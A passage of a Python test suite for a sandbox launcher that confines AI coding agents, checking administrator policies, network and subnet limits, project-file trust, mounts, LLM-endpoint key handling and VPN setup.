              match="--log-dir must lie outside the workspace, mounts and --state-dir")


# --- MCP servers ----------------------------------------------------------------------------------------------

MCP, mcp = scenarios()


@mcp
def mcp_demo(m):
    plan = m.plan("--mcp", "demo")
    assert plan["mcp"] == [{"name": "demo", "socket": str(s.mcp_socket_dir("demo") / "server.sock")}]
    run = m.run("--mcp", "demo", "--mcp", "demo")
    assert m.mcp_started == ["demo"]
    assert (f"src={s.mcp_socket_dir('demo')},dst={s.MCP_UPSTREAM_DIR}/demo" if m.backend == "podman"
            else f"--ro-bind {s.mcp_socket_dir('demo')} {s.MCP_UPSTREAM_DIR}/demo") in run.joined
    command = run.config["command"]
    if m.agent == "claude":
        assert json.loads(command[command.index("--mcp-config") + 1])["mcpServers"]["demo"]["command"] == "python3"
    elif m.agent == "codex":
        assert 'mcp_servers.demo.command="python3"' in command
    else:
        assert json.loads(run.env["OPENCODE_CONFIG_CONTENT"])["mcp"]["demo"]["type"] == "local"


@mcp
def mcp_refusals(m):
    m.refused("--mcp", "bad name", match="--mcp NAME")
    # Offline the server is still reached over its socket.
    assert m.plan("--offline", "--mcp", "demo")["mcp"][0]["name"] == "demo"


# --- administrator policy ---------------------------------------------------------------------------------------

POLICY, policy = scenarios()


@policy
def forbid_on_the_command_line(m):
    m.policy(forbid=["--no-proxy", "--privacy-check=off", "--ask=off"], message="see handbook")
    m.refused("--no-proxy", match=r"--no-proxy is not allowed by the administrator's policy .*\(see handbook\)")
    m.refused("--privacy-check", "off", match="--privacy-check=off is not allowed")
    m.refused("--ask", "off", match="--ask=off is not allowed")
    assert m.run("--privacy-check", "always").proxy["push_check"]  # another value is fine


@policy
def forbid_through_short_forms_and_profiles(m):
    m.policy(forbid=["--egress-all-allow", "--dangerously-skip-permissions"])
    m.refused("-E", match="--egress-all-allow is not allowed")
    m.refused("--profile", "egress-all", match="--egress-all-allow is not allowed")
    m.refused("-D", match="--dangerously-skip-permissions is not allowed")


@policy
def forbid_one_preset_leaves_the_others(m):
    """Regression: the presets share one list; forbidding --allow-github refused --allow-pypi too."""
    m.policy(forbid=["--allow-github"])
    assert m.plan("--allow-pypi")["https_hosts"][-2:] == s.PRESETS["pypi"]
    m.refused("--allow-github", match="--allow-github is not allowed")
    m.refused("--profile", "development", match="--allow-github is not allowed")
    m.monkeypatch.setenv("GH_PAT", TOKEN)
    m.refused("--git-token-env", "https://github.com=GH_PAT", match="--allow-github is not allowed")


@policy
def forbid_no_tmux(m):
    """Regression: --no-tmux stores False against the default None and slipped through."""
    m.policy(forbid=["--no-tmux"])
    m.refused(match="--no-tmux is not allowed")  # the matrix's command line has --no-tmux


@policy
def forbid_dns_covers_what_implies_it(m):
    """Regression: --nameserver (and --egress-all-allow) give DNS like --dns, but passed a forbidden --dns."""
    m.policy(forbid=["--dns"])
    for options in (["--dns"], ["--profile", "dns"], ["--nameserver", "9.9.9.9"], ["--egress-all-allow"]):
        m.refused(*options, match="--dns is not allowed")
    assert m.plan()["nameservers"] == []


@policy
def forbid_against_the_project_file(m):
    m.policy(forbid=["--no-proxy", "--allow-host"])
    m.project_file({"options": ["--no-proxy"]})
    m.refused(match="--no-proxy is not allowed")
    m.project_file({"options": ["--allow-host", "example.org"]})
    m.refused(match="--allow-host is not allowed")
    m.project_file({"options": ["--allow-pypi"]})
    assert "pypi.org" in m.plan()["https_hosts"]


@policy
def backends(m):
    m.policy(backends=["podman"])
    if m.backend == "bwrap":
        m.refused(match="The backend bwrap is not allowed")
    else:
        assert m.plan()["backend"] == "podman"


@policy
def network_ceiling(m):
    m.policy(allow_within=["10.0.0.0/8"], allow_hosts=["pypi.org", "files.pythonhosted.org", "*.corp.example"])
    plan = m.plan("--allow", "10.2.0.0/16", "--allow-tcp", "10.0.0.5:5432", "--allow-pypi",
                  "--allow-host", "git.corp.example")
    assert provider(m)[0] in plan["https_hosts"] and "git.corp.example" in plan["https_hosts"]
    m.refused("--allow", "192.0.2.0/24", match="192.0.2.0/24 lies outside the networks")
    m.refused("--allow-tcp", "192.0.2.5:22", match="192.0.2.5 lies outside")
    m.refused("--dns", match="1.1.1.1 lies outside")
    m.refused("--egress-all-allow", match="--egress-all-allow reaches beyond")
    m.refused("--allow-github", match="github.com is not among the hosts")
    m.refused("--frontier", match="is not among the hosts")
    if m.backend == "podman":
        m.refused("--allow-host-port", "3000", match="127.0.0.1 lies outside")
    run = m.run("--allow", "10.2.0.0/16")
    assert run.config["policy"]["allow_within"] == ["10.0.0.0/8"]


# --- project file (.sandbox-ai.json) ------------------------------------------------------------------------------

PROJECT, project = scenarios()


@project
def options_merge_and_the_command_line_adds(m):
    m.project_file({"options": ["--allow-pypi", "--memory", "2g"], "agent_args": ["--from-file"]})
    plan = m.plan("--allow-host", "example.org")
    assert plan["project_config"] == str(m.work / s.CONFIG_NAME)
    assert plan["https_hosts"] == provider(m) + s.PRESETS["pypi"] + ["example.org"]
    assert plan["limits"]["memory"] == "2g" and plan["agent_args"] == ["--from-file"]
    # The command line wins for single values and replaces the agent arguments.
    assert m.plan("--memory", "4g")["limits"]["memory"] == "4g"
    run = m.run(agent_args=["--mine"])
    assert run.config["command"][-1] == "--mine" and "--from-file" not in run.config["command"]
    assert m.plan("--no-config")["project_config"] is None


@project
def file_offline_against_command_line_allow(m):
    m.project_file({"options": ["--offline"]})
    assert m.plan()["offline"] is True
    m.refused("--allow-host", "example.org", match="--offline conflicts")
    m.project_file({"options": ["--no-proxy"]})
    m.refused("--token-proxy", match="--token-proxy needs the connection proxy")


@project
def auth_choice_of_the_command_line_replaces_the_files(m):
    login = m.private_file("login.json", '{"fixture": "file"}')
    m.project_file({"options": ["--auth-file", str(login)]})
    assert m.plan()["auth_mode"] == "file" and m.plan()["auth_file"] == str(login)
    assert m.plan("--no-auth")["auth_mode"] == "none"
    other = m.private_file("other.json", '{"fixture": "other"}')
    assert m.plan("--auth-file", str(other))["auth_file"] == str(other)
    target = s.AUTH_TARGETS[m.agent]
    copied = m.plan("--copy", f"{other}:{target}")
    assert copied["auth_mode"] == "manual" and copied["auth_file"] is None
    m.project_file({"options": ["--no-auth"]})
    assert m.plan("--copy-auth")["auth_mode"] == "copy"
    # Two choices on the command line are still one too many.
    m.refused("--copy-auth", "--auth-file", str(other), match="Choose one of")
    run = m.run("--auth-file", str(other))
    assert run.auth == ('{"fixture": "other"}', 0o600)
    assert m.run().auth is None  # the file's --no-auth


@project
def import_codex_auth_is_opencode_only(m):
    codex = m.private_file("codex-auth.json", json.dumps({"tokens": {}}))
    if m.agent != "opencode":
        m.refused("--import-codex-auth", str(codex), match="--import-codex-auth is supported only for OpenCode")
        m.project_file({"options": ["--import-codex-auth", str(codex)]})
        m.refused(match="--import-codex-auth is supported only for OpenCode")
    else:
        m.project_file({"options": ["--no-auth"]})
        assert m.plan("--import-codex-auth", str(codex))["auth_mode"] == "codex_import"


@project
def refused_files(m):
    path = m.project_file({"options": ["--allow-pypi"]}, trust=False)
    m.refused(match="is not trusted")
    s.trust_config(path)
    path.write_text(path.read_text().replace("pypi", "github"))
    m.refused(match="changed since it was trusted")
    for options, message in ((["--session", "x"], "option --session is not allowed"),
                             (["--workspace", "/elsewhere"], "option --workspace is not allowed"),
                             (["--state-dir", "relative"], "use absolute paths"),
                             (["--dry-run"], "option --dry-run is not allowed")):
        m.project_file({"options": options})
        m.refused(match=message)
    other = next(agent for agent in AGENTS if agent != m.agent)
    m.project_file({"agent": other})
    m.refused(match=f"is for {other}")
    path.unlink()
    m.refused(match="trusted project configuration .* is missing")


@project
def file_workspaces_and_kits(m):
    extra = m.tmp / "lib"
    extra.mkdir()
    m.project_file({"workspaces": [str(extra)], "options": ["--no-memory", "--no-default-kit"]})
    plan = m.plan()
    assert plan["workspaces"] == [{"host": str(m.work), "sandbox": "/work"},
                                  {"host": str(extra), "sandbox": "/workspaces/lib"}]
    assert plan["kits"]["memory"] is None and plan["kits"]["sources"] == []
    run = m.run()
    assert m.mount(extra, "/workspaces/lib") in run.joined


# --- workspaces, files and the agent's own options ------------------------------------------------------------

AGENT, agent_options = scenarios()


@agent_options
def workspaces_and_mounts(m):
    data = m.tmp / "data"
    data.mkdir()
    run = m.run("--workspace-ro", "--mount", f"{data}:/opt/data:ro")
    assert run.config["watch"] == [] and m.plan("--workspace-ro")["workspace_mode"] == "ro"
    if m.backend == "podman":
        assert f"src={m.work},dst=/work,ro" in run.joined and f"src={data},dst=/opt/data,ro" in run.joined
    else:
        assert f"--ro-bind {m.work} /work" in run.joined and f"--ro-bind {data} /opt/data" in run.joined
    m.refused("--mount", f"{data}:/work:rw", match="Use --workspace to mount /work")
    m.refused("--mount", f"{data}:/etc/x:ro", match="Mount destinations must be under /work, /mnt or /opt")
    m.refused("--workspace", f"{m.work},{m.work / 'sub'}", match="Workspaces must not overlap")


@agent_options
def package_outside_agent_trees(m):
    """Review finding (HIGH): started from sandbox-ai.pyz or the AppImage, the package file and its unpacked copy
    must not be in a workspace, an rw mount or --state-dir (the agent would rewrite what runs next on the host)."""
    package = m.work / "sandbox-ai.pyz"
    package.write_bytes(b"#!/bin/sh\n")
    copy = s.HERE.parent  # the launcher's own tree stands for the copy (it must hold the launcher)
    m.monkeypatch.setenv("SANDBOX_AI_PACKAGE", str(package))
    m.monkeypatch.setenv("SANDBOX_AI_PACKAGE_COPY", str(copy))
    m.refused(match="contains .*sandbox-ai.pyz")
    elsewhere = m.tmp / "bin"
    package.rename(elsewhere / "sandbox-ai.pyz")
    m.monkeypatch.setenv("SANDBOX_AI_PACKAGE", str(elsewhere / "sandbox-ai.pyz"))
    assert m.plan()["workspace"] == str(m.work)
    m.refused("--mount", f"{elsewhere}:/opt/tools:rw", match="--mount .* contains .*sandbox-ai.pyz")
    m.refused("--state-dir", str(copy / "state"), match="--state-dir .* lies in .*the copy sandbox-ai runs in")
    cache = m.tmp / "host" / ".cache" / "sandbox-ai"  # where the copies live: no sandbox gets it (review finding)
    (cache / "pyz").mkdir(parents=True)
    m.refused("--mount", f"{cache}:/mnt/c:rw", match=r"\.cache/sandbox-ai")
    m.refused("--mount", f"{cache / 'pyz'}:/mnt/c:rw", match=r"lies in .*\.cache/sandbox-ai")


@agent_options
def environment_variables(m):
    m.monkeypatch.setenv("MATRIX_VALUE", "visible")
    run = m.run("--env", "MATRIX_VALUE")
    assert run.env["MATRIX_VALUE"] == "visible" and run.config["secret_names"] == ["MATRIX_VALUE"]
    assert "visible" not in json.dumps(m.plan("--env", "MATRIX_VALUE"))
    m.refused("--env", "PATH", match="Sandbox-owned variable cannot be overridden: PATH")
    m.refused("--env", "MATRIX_UNSET", match="Host variable is not set")


@agent_options
def dangerously_skip_permissions(m):
    run = m.run("-D")
    assert run.config["command"][1:1 + len(s.DANGER_ARGS[m.agent])] == s.DANGER_ARGS[m.agent]
    assert all(run.env[k] == v for k, v in s.DANGER_ENV[m.agent].items())
    if m.agent == "codex":
        # The bypass replaces Codex's own sandbox switch.
        assert "--dangerously-bypass-approvals-and-sandbox" in run.config["command"]
        assert "danger-full-access" not in run.config["command"]
    plain = m.run()
    assert not any(flag in plain.config["command"] for flag in s.DANGER_ARGS[m.agent])
    assert (plain.config["command"][1:3] == ["--sandbox", "danger-full-access"]) == (m.agent == "codex")


@agent_options
def local_config_is_opencode_only(m):
    config = m.private_file("opencode.json", json.dumps({"provider": {}}))
    if m.agent != "opencode":
        m.refused("--local-config", str(config), match="--local-config requires OpenCode")
        return
    plan = m.plan("--local-config", str(config), "--allow-tcp", "192.0.2.20:11434")
    assert plan["https_hosts"] == [] and plan["allow_tcp"] == ["192.0.2.20:11434"]  # no cloud provider
    run = m.run("--local-config", str(config), "--allow-tcp", "192.0.2.20:11434")
    assert run.env["OPENCODE_CONFIG"] == "/root/.config/opencode/opencode.jsonc"
    assert ".config/opencode/opencode.jsonc" in run.home_files


@agent_options
def image_binary_and_runtime(m):
    run = m.run("--image", "localhost/custom:1")
    other = next(agent for agent in AGENTS if agent != m.agent)
    if m.backend == "podman":
        assert "localhost/custom:1" in run.command and run.config["command"][0] == m.agent
        assert m.run("--binary", "/opt/agent/bin/x").config["command"][0] == "/opt/agent/bin/x"
        m.refused("--runtime", "/opt", match="--runtime applies only to bwrap")
    else:
        # bwrap runs the host's executable, found on PATH and resolved.
        assert run.config["command"][0] == str(m.tmp / "bin" / m.agent)
        assert m.run("--binary", other).config["command"][0] == str(m.tmp / "bin" / other)


# --- the sandbox's own network: --subnet, --subnet6, defaults.json, the policy's subnet_within -----------------

SUBNET, subnet = scenarios()


def defaults_json(document):
    path = Path(os.environ["HOME"]) / ".config/sandbox-ai/defaults.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps({"version": 1, **document}))
    return path


def network_value(run):
    return run.create[run.create.index("--network") + 1]


@subnet
def subnet_moves_only_the_sandbox(m):
    plan = m.plan("--subnet", "10.20.0.0/24")
    assert plan["sandbox_network"]["ipv4"] == {"subnet": "10.20.0.0/24", "address": "10.20.0.100",
                                               "gateway": "10.20.0.2", "dns": "10.20.0.3", "from": "--subnet"}
    run, plain = m.run("--subnet", "10.20.0.0/24"), m.run()
    if m.backend == "podman":
        assert network_value(run) == s.POD_NETWORK + ",-a,10.20.0.100,-n,24,-g,10.20.0.2,--dns-forward,10.20.0.3"
    else:
        assert "--cidr=10.20.0.0/24" in run.slirp and not any("--cidr" in part for part in plain.slirp)
    assert "sandbox network --subnet 10.20.0.0/24: the sandbox 10.20.0.100, gateway 10.20.0.2" in run.err
    # Nothing else follows the sandbox's address: the firewall, the proxy's redirect (to loopback), the resolver
    # files and what the proxy allows are those of a start without --subnet.
    assert run.firewall == plain.firewall and "redirect to :" in run.firewall
    for name in ("resolv.conf", "nsswitch.conf", "hosts"):
        assert run.files[name] == plain.files[name], name
    assert run.proxy["allow"] == plain.proxy["allow"]
    assert "10.20.0" not in run.firewall + json.dumps(run.proxy) + json.dumps(run.config)
    assert run.run_record["subnets"] == ["10.20.0.0/24"] and plain.run_record["subnets"] == []


@subnet
def default_layout_per_backend(m):
    network = m.plan()["sandbox_network"]
    if m.backend == "podman":
        assert network == {"ipv4": {"subnet": None, "from": "the host's addresses (pasta)"},
                           "ipv6": {"subnet": None, "from": "the host's addresses (pasta)"}}
    else:
        assert network["ipv4"]["subnet"] == "10.0.2.0/24" and network["ipv6"]["subnet"] == "fd00::/64"
    assert m.plan("--offline")["sandbox_network"] is None


@subnet
def subnet6_is_podman_only(m):
    if m.backend == "bwrap":
        m.refused("--subnet6", "fd20::/64", match=r"slirp4netns \(bwrap\) has no IPv6 option")
        return
    run = m.run("--subnet6", "fd20::/64")
    assert network_value(run) == s.POD_NETWORK + ",-a,fd20::100,-g,fd20::2"  # pasta: IPv6 is always a /64
    both = network_value(m.run("--subnet", "10.20.0.0/24", "--subnet6", "fd20::/64", "--allow-host-port", "3000"))
    assert "-T,3000" in both and "-a,10.20.0.100,-n,24,-g,10.20.0.2,-a,fd20::100,-g,fd20::2" in both


@subnet
def subnet_refusals(m):
    m.refused("--offline", "--subnet", "10.20.0.0/24", match="--offline conflicts")
    m.refused("--subnet", "192.168.0.0/16", match="overlaps 192.168.1.0/24, a network this host routes to")
    m.refused("--subnet", "10.20.0.0/26", match="/8 to /25")
    m.refused("--subnet", "8.8.8.0/24", match="not a private range")
    m.refused("--subnet", "127.0.0.0/8", match="loopback")
    m.refused("--subnet", "10.20.0.100/24", match="give the network address, 10.20.0.0/24")
    m.refused("--subnet", "fd20::/64", match="an IPv4 network")
    if m.backend == "podman":
        m.refused("--network", "lab", "--subnet", "10.20.0.0/24", match="with --network the Podman network decides")
        m.refused("--subnet6", "fd17:625c:f037:2::/64", match="a network this host routes to")


@subnet
def subnet_cannot_hide_allowed_destinations(m):
    """An allowed address inside the sandbox's own network would reach its gateway or DNS forwarder instead
    (slirp4netns's gateway leads to the host): refused, however the address came in."""
    for options, message in ((["--allow", "10.0.0.0/8"], "--allow 10.0.0.0/8 lies inside"),
                             (["--allow-tcp", "10.20.0.2:22"], "--allow-tcp 10.20.0.2:22 lies inside"),
                             (["--nameserver", "10.20.0.2"], "the nameserver 10.20.0.2 lies inside")):
        m.refused("--subnet", "10.20.0.0/24", *options, match=message)
    # A name that resolves into it at the start (a pinned host's address).
    m.monkeypatch.setattr(s, "resolve_hosts", lambda hosts: {h: ["10.20.0.7"] for h in hosts})
    m.monkeypatch.setattr(s, "resolve_pod_hosts", lambda a, hosts: {h: ["10.20.0.7"] for h in hosts})
    m.refused("--subnet", "10.20.0.0/24", match=r"10.20.0.7 \(an allowed host's address\) lies inside")


@subnet
def nameserver_at_the_dns_forwarder(m):
    """.3 is the backend's DNS forwarder to the host's resolvers (slirp4netns's own, pasta's --dns-forward)."""
    run = m.run("--subnet", "10.20.0.0/24", "--nameserver", "10.20.0.3")
    assert run.files["resolv.conf"] == "nameserver 10.20.0.3\n"
    assert "ip daddr 10.20.0.3 udp dport 53 accept" in run.firewall
    if m.backend == "podman":
        assert network_value(run).endswith(",--dns-forward,10.20.0.3")


@subnet
def user_defaults_file(m):
    path = defaults_json({"subnet": "10.30.0.0/24", "subnet6": "fd30::/64"})
    network = m.plan()["sandbox_network"]
    assert network["ipv4"]["subnet"] == "10.30.0.0/24" and network["ipv4"]["from"] == str(path)
    # slirp4netns cannot move IPv6: the default is left out on bwrap, without an error.
    assert network["ipv6"]["subnet"] == ("fd30::/64" if m.backend == "podman" else "fd00::/64")
    assert m.plan("--subnet", "10.31.0.0/24")["sandbox_network"]["ipv4"]["subnet"] == "10.31.0.0/24"
    assert m.plan("--offline")["sandbox_network"] is None  # no network to give it to
    if m.backend == "podman":
        assert m.plan("--network", "lab")["sandbox_network"] is None
    # A default that clashes with this run's destinations is refused, naming where it came from.
    m.refused("--allow-tcp", "10.30.0.9:22", match=f"--subnet 10.30.0.0/24 \\(from {path}\\)")
    path.write_text(json.dumps({"version": 1, "subnet": "8.8.8.0/24"}))
    m.refused(match="not a private range")


@subnet
def project_file_sets_the_subnet(m):
    m.project_file({"options": ["--subnet", "10.40.0.0/24"]})
    assert m.plan()["sandbox_network"]["ipv4"]["subnet"] == "10.40.0.0/24"
    assert m.plan("--subnet", "10.41.0.0/24")["sandbox_network"]["ipv4"]["subnet"] == "10.41.0.0/24"
    # The file cannot use its own subnet to swallow an address it allows.
    m.project_file({"options": ["--subnet", "10.40.0.0/24", "--allow", "10.40.0.0/16"]})
    m.refused(match="--allow 10.40.0.0/16 lies inside")


@subnet
def policy_default_and_ceiling(m):
    m.policy(subnet="10.200.0.0/24", subnet_within=["10.200.0.0/16"])
    network = m.plan()["sandbox_network"]["ipv4"]
    assert network["subnet"] == "10.200.0.0/24" and network["from"].startswith("the administrator's policy")
    assert m.plan("--subnet", "10.200.9.0/24")["sandbox_network"]["ipv4"]["subnet"] == "10.200.9.0/24"
    m.refused("--subnet", "10.20.0.0/24", match="lies outside the networks the administrator's policy allows")
    run = m.run()
    if m.backend == "podman":
        assert "-a,10.200.0.100,-n,24,-g,10.200.0.2" in network_value(run)
    else:
        assert "--cidr=10.200.0.0/24" in run.slirp
    # Neither a project file nor your defaults widen it.
    m.project_file({"options": ["--subnet", "10.20.0.0/24"]})
    m.refused(match="--subnet 10.20.0.0/24 lies outside")
    m.project_file({"options": []})
    path = defaults_json({"subnet": "172.20.0.0/16"})
    m.refused(match=f"--subnet 172.20.0.0/16 \\(from {path}\\) lies outside")


@subnet
def policy_forbids_choosing(m):
    m.policy(forbid=["--subnet"], subnet="10.200.0.0/24")
    assert m.plan()["sandbox_network"]["ipv4"]["subnet"] == "10.200.0.0/24"  # the policy's own is no choice
    m.refused("--subnet", "10.200.0.0/24", match="--subnet is not allowed")
    m.project_file({"options": ["-sn", "10.201.0.0/24"]})  # the short form too
    m.refused(match="--subnet is not allowed")


@subnet
def remembered_approval_inside_the_subnet_is_skipped(m):
    approved = Path(os.environ["HOME"]) / ".config/sandbox-ai/approved.json"
    approved.parent.mkdir(parents=True)
    approved.write_text(json.dumps({str(m.work): {"hosts": [], "tcp": ["10.20.0.9:8443", "192.0.2.9:8443"]}}))
    approved.chmod(0o600)
    plan = m.plan("--subnet", "10.20.0.0/24")
    assert plan["allow_tcp"] == ["192.0.2.9:8443"]
    assert "not applied, inside the sandbox's own network: 10.20.0.9:8443" in m.run("--subnet", "10.20.0.0/24").err


# --- LLM servers (--llm NAME[:MODEL]) ---------------------------------------------------------------------------

LLM, llm_case = scenarios()
LLM_KEY = "sk-matrix-llm-key-0123456789abcdef"
PLACEHOLDER = "sandbox-ai-llm-key-placeholder"


def llm_endpoint(m, name="gpu", **record):
    """An endpoint in the host's store as `sandbox-ai llm add` keeps it, its key in the secret store (files)."""
    m.monkeypatch.setenv("SANDBOX_AI_SECRETS", "file")
    module = s.load_llm_module()
    store = module.load_store()
    store["endpoints"][name] = {"kind": "ollama", "url": "http://10.0.0.5:11434", "model": "qwen3:8b",
                                "api_key_secret": "LLM_KEY", **record}
    module.save_store(store)
    module.load_secret_store_module().FileStore().set("LLM_KEY", LLM_KEY)
    return module


@llm_case
def llm_opens_exactly_its_server(m):
    llm_endpoint(m)
    plan = m.plan("--llm", "gpu", "--no-provider-defaults")
    assert plan["https_hosts"] == [] and plan["allow_tcp"] == ["10.0.0.5:11434"] and plan["auth_mode"] == "none"
    assert plan["llm"]["opens"] == "10.0.0.5:11434" and plan["llm"]["key_secret"] == "LLM_KEY"
    run = m.run("--llm", "gpu", "--no-provider-defaults")
    assert "ip daddr 10.0.0.5 tcp dport 11434 accept" in run.firewall and "dport 443" not in run.firewall
    assert run.proxy["allow"]["https"] == [] and run.proxy["allow"]["tcp"] == [["10.0.0.5", 11434]]
    # Without --no-provider-defaults the agent's provider stays reachable as well.
    assert m.plan("--llm", "gpu")["https_hosts"] == provider(m)


@llm_case
def llm_key_stays_with_the_proxy(m):
    llm_endpoint(m, headers={"CF-Access-Client-Secret": "LLM_KEY"})
    plan = m.plan("--llm", "gpu")
    run = m.run("--llm", "gpu")
    entry = run.proxy["llm"][0]
    assert entry["key"] == LLM_KEY and entry["headers"] == [["CF-Access-Client-Secret", LLM_KEY]]
    assert entry["addresses"] == ["10.0.0.5"] and entry["placeholder"] == PLACEHOLDER
    for where in (json.dumps(run.config), run.err, json.dumps(plan), "\n".join(run.home_text.values()),
                  run.files["hosts"], run.firewall):
        assert LLM_KEY not in where
    assert PLACEHOLDER in json.dumps(run.config["env"]) + "\n".join(run.home_text.values())


@llm_case
def llm_agent_configuration(m):
    llm_endpoint(m)
    run = m.run("--llm", "gpu:qwen3-coder:30b")
    if m.agent == "claude":
        assert run.env["ANTHROPIC_BASE_URL"] == "http://10.0.0.5:11434" and run.env["ANTHROPIC_API_KEY"] == ""
        assert run.env["ANTHROPIC_AUTH_TOKEN"] == PLACEHOLDER and run.env["ANTHROPIC_MODEL"] == "qwen3-coder:30b"
        assert json.loads(run.home_text[".claude/settings.json"])["skipWebFetchPreflight"] is True
        assert json.loads(run.home_text[".claude.json"])["hasCompletedOnboarding"] is True
    elif m.agent == "codex":
        profile = run.home_text[".codex/sandbox-ai-llm.config.toml"]
        assert 'base_url = "http://10.0.0.5:11434/v1"' in profile and 'model = "qwen3-coder:30b"' in profile
        assert run.config["command"][1:3] == ["--profile", "sandbox-ai-llm"] and run.env["SANDBOX_AI_LLM_KEY"] == PLACEHOLDER
    else:
        config = json.loads(run.home_text[".config/opencode/sandbox-ai-llm.json"])
        assert run.env["OPENCODE_CONFIG"] == "/root/.config/opencode/sandbox-ai-llm.json"
        assert config["provider"]["llm-gpu"]["options"] == {"baseURL": "http://10.0.0.5:11434/v1", "apiKey": PLACEHOLDER}
        assert config["model"] == "llm-gpu/qwen3-coder:30b"
    assert not any(s.AUTH_TARGETS[m.agent] == name for name in run.home_files)  # no cloud login handed over


@llm_case
def llm_claude_needs_the_anthropic_api(m):
    llm_endpoint(m, kind="openai-compatible", url="https://gw.example.org")
    if m.agent == "claude":
        m.refused("--llm", "gpu", match="Claude Code speaks only the Anthropic Messages API")
        llm_endpoint(m, kind="openai-compatible", url="https://gw.example.org", anthropic=True)
    assert m.plan("--llm", "gpu")["llm"]["api"] == {"claude": "anthropic-messages", "codex": "openai-responses",
                                                    "opencode": "openai-chat"}[m.agent]


@llm_case
def llm_name_is_pinned_on_its_port(m):
    name = "llm.example.org"
    llm_endpoint(m, url=f"https://{name}:8443/team")
    run = m.run("--llm", "gpu", "--no-provider-defaults")
    assert f"{address(name)} {name}" in run.files["hosts"] and name in run.config["pinned"]
    assert f"ip daddr {address(name)} tcp dport 8443 accept" in run.firewall and "dport 443" not in run.firewall
    rule = run.proxy["http_rules"][0]
    assert rule["host"] == name and rule["path"] == "/team/**" and rule["addresses"] == [address(name)]
    assert run.proxy["llm"][0]["prefix"] == "/team" and run.proxy["llm"][0]["addresses"] == [address(name)]
    # A name that resolves to a public address gets no plain http.
    llm_endpoint(m, url=f"http://{name}:8000")
    m.refused("--llm", "gpu", match=f"plain http to {address(name)}")


@llm_case
def llm_on_the_hosts_loopback(m):
    llm_endpoint(m, url="http://localhost:11434")
    if m.backend == "bwrap":
        m.refused("--llm", "gpu", match="only the Podman backend")
        return
    plan = m.plan("--llm", "gpu")
    assert plan["host_ports"] == [11434] and plan["llm"]["agent_url"].startswith("http://127.0.0.1:11434")
    run = m.run("--llm", "gpu")
    assert run.proxy["llm"][0]["addresses"] == ["127.0.0.1"] and "tcp dport != { 11434 } return" in run.firewall


@llm_case
def llm_refusals(m):
    llm_endpoint(m)
    m.refused("--llm", "gpu", "--no-proxy", match="drop --no-proxy")
    m.refused("--llm", "gpu", "--offline", match="--offline conflicts|drop --offline")
    m.refused("--llm", "nope", match="no LLM endpoint nope")
    m.refused("--llm", "gpu:bad model", match="--llm expects NAME")
    llm_endpoint(m, api_key_secret="MISSING")
    m.refused("--llm", "gpu", match="no secret MISSING")
    llm_endpoint(m, model=None, api_key_secret=None)
    m.refused("--llm", "gpu", match="name a model")
    assert m.plan("--llm", "gpu:m", "--no-proxy")["proxy"]["enabled"] is False  # no key: no proxy needed
    if m.agent == "codex":
        m.refused("--llm", "gpu:m", "--", "--profile", "x", match="drop -p/--profile")
    if m.agent == "opencode":
        config = m.private_file("oc.json", "{}")
        m.refused("--llm", "gpu:m", "--local-config", str(config), match="drop --local-config")
    if m.agent == "claude":
        m.monkeypatch.setenv("ANTHROPIC_MODEL", "x")
        m.refused("--llm", "gpu:m", "--env", "ANTHROPIC_MODEL", match="--llm sets ANTHROPIC_MODEL")


@llm_case
def llm_policy_and_project_file(m):
    llm_endpoint(m)
    m.project_file({"options": ["--llm", "gpu:from-the-file", "--no-provider-defaults"]})
    plan = m.plan()
    assert plan["llm"]["model"] == "from-the-file" and plan["https_hosts"] == []
    assert m.plan("--llm", "gpu:mine")["llm"]["model"] == "mine"  # the command line wins
    m.policy(forbid=["--llm"])
    m.refused(match="--llm is not allowed by the administrator's policy")
    m.policy(allow_within=["192.168.0.0/16"], allow_hosts=["*.corp.example"])
    m.refused("--no-config", "--llm", "gpu", match="10.0.0.5 lies outside the networks")
    llm_endpoint(m, url="https://llm.example.org:8443")
    m.refused("--no-config", "--llm", "gpu", match="llm.example.org is not among the hosts")
    llm_endpoint(m, url="https://llm.corp.example:8443")
    assert m.plan("--no-config", "--llm", "gpu")["llm"]["opens"].startswith("llm.corp.example:8443")


@llm_case
def llm_behind_its_vpn(m):
    """An endpoint added with --vpn: --llm starts the sandbox behind that VPN, and the server's name is resolved
    through the tunnel (a name only the VPN's resolver knows works), pinned and opened on its port alone."""
    m.vpn_profile()
    name = "llm.corp.example"
    llm_endpoint(m, url=f"https://{name}:8443", vpn="corp")
    if m.backend == "bwrap":
        m.refused("--llm", "gpu", match=r"--vpn corp \(from --llm gpu\) needs the Podman backend")
        return
    plan = m.plan("--llm", "gpu")
    assert plan["vpn"]["profile"] == "corp" and plan["llm"]["vpn"] == "corp"
    record = m.fake_vpn()
    run = m.run("--llm", "gpu", "--no-provider-defaults")
    assert "--llm gpu is reached through the VPN profile corp: the sandbox starts behind it" in run.err
    _, data = record.containers[0]
    assert data["resolve"] == [name]  # through the tunnel, not by the host
    assert f"{vpn_address(name)} {name}" in run.files["hosts"] and address(name) not in run.files["hosts"]
    assert f"ip daddr {vpn_address(name)} tcp dport 8443 accept" in run.firewall and "dport 443" not in run.firewall
    assert run.proxy["llm"][0]["addresses"] == [vpn_address(name)]
    # The same --vpn given as well is fine; another one is refused: a sandbox has one VPN.
    assert m.plan("--llm", "gpu", "--vpn", "corp")["vpn"]["profile"] == "corp"
    m.refused("--llm", "gpu", "--vpn", "home", match="this start has --vpn home; a sandbox has one VPN")
    m.policy(forbid=["--vpn"])
    m.refused("--llm", "gpu", match="--vpn is not allowed by the administrator's policy .*; --llm gpu is reached "
                                    "through it")
    m.policy(require_vpn=["corp"])
    assert m.plan("--llm", "gpu")["vpn"]["profile"] == "corp"  # the endpoint's VPN satisfies the policy
# --- VPN ----------------------------------------------------------------------------------------------------------------

VPN, vpn = scenarios()
NO_BWRAP = "--vpn needs the Podman backend"


@vpn
def vpn_plan_shows_the_profile_never_a_key(m):
    key = m.vpn_profile()
    if m.backend == "bwrap":
        m.refused("--vpn", "corp", match=NO_BWRAP)
        return
    plan = m.plan("--vpn", "corp")
    assert plan["vpn"]["profile"] == "corp" and plan["vpn"]["endpoints"] == ["vpn.example.org:51820"]
    assert plan["vpn"]["interface"].startswith("wg0") and plan["vpn"]["tunnel"] == "full" and plan["vpn"]["ipv6"]
    assert plan["vpn"]["checks"]["on_failure"] == "stop" and plan["vpn"]["checks"]["ip_echo"] == m.vpn.ECHO_GENERIC
    assert key not in json.dumps(plan) and "VPN_CORP" not in json.dumps(plan)
